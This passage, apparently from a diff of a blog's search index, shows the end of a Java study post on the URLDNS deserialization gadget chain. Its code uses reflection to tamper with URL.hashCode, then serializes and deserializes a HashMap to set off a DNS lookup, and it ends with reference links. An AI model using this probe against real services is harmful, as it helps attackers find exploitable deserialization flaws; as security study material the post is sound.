class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);  <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">        filed.set(url, <span class="number">209</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">209</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间为: &quot;</span> + simpleDateFormat.format(nowTime));</span><br><span class="line">        filed.set(url, -<span class="number">1</span>); <span class="comment">//本地编译中不进行DNS解析</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./dnsser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(hashmap);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./dnsser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>参考：<a href="https://blog.csdn.net/a745233700/article/details/82893076">(140条消息) Java基础篇：反射机制详解_张维鹏的博客-CSDN博客</a></p>
+<p><a href="https://www.freebuf.com/articles/web/327710.html">Java安全学习—URLDNS链 - FreeBuf网络安全行业门户</a></p>
+]]></content>
+      <tags>
+        <tag>java</tag>
       </tags>
   </entry>
 </search>
